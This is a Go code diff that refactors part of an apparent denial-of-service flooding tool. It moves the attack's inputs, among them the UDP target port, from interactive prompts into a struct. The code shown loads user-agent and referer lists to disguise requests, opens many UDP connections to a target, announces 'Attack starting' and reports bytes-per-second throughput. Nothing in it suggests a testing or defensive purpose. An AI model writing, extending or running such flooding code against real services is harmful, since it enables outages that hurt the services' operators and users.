@@ -12,7 +12,6 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -124,28 +123,11 @@ func formatBytes(bytes float64) string {
 	return fmt.Sprintf("%.2f %s", bytes, units[i])
 }
 
-func RunAttack() {
+func (in *Inputs) RunAttack() {
 	rand.Seed(time.Now().UnixNano())
-	reader := bufio.NewReader(os.Stdin)
 	userAgents = loadListFromFile("useragents.txt")
 	referers = loadListFromFile("referers.txt")
-	var err error
 	var durationSec int64
-
-	in, err := PromptInputs(reader, os.Stdout)
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	var udpPort int
-	if in.Method == 3 || in.Method == 4 || in.Method == 5 {
-		fmt.Print(color.Yellow + "🎯 UDP Port (target): " + color.Reset)
-		portStr, _ := reader.ReadString('\n')
-		udpPort, _ = strconv.Atoi(strings.TrimSpace(portStr))
-		if udpPort < 1 {
-			udpPort = 5000
-		}
-	}
 
 	fmt.Println(color.Green + "🚀 Attack starting..." + color.Reset)
 
@@ -181,7 +163,7 @@ func RunAttack() {
 			case 3, 4, 5:
 				conns := make([]net.Conn, in.Connections)
 				for i := 0; i < in.Connections; i++ {
-					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", in.Target, udpPort))
+					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", in.Target, in.Port))
 					if err != nil {
 						continue
 					}
@@ -242,14 +224,3 @@ func RunAttack() {
 		fmt.Printf("%s📈 Average BPS     : %s%s\n", color.Yellow, formatBytes(bps), color.Reset)
 	}
 }
-
-//func isValidMethod(mode int) bool {
-//	validModes := map[int]bool{
-//		1: true,
-//		2: true,
-//		3: true,
-//		4: true,
-//		5: true,
-//	}
-//	return validModes[mode]
-//}
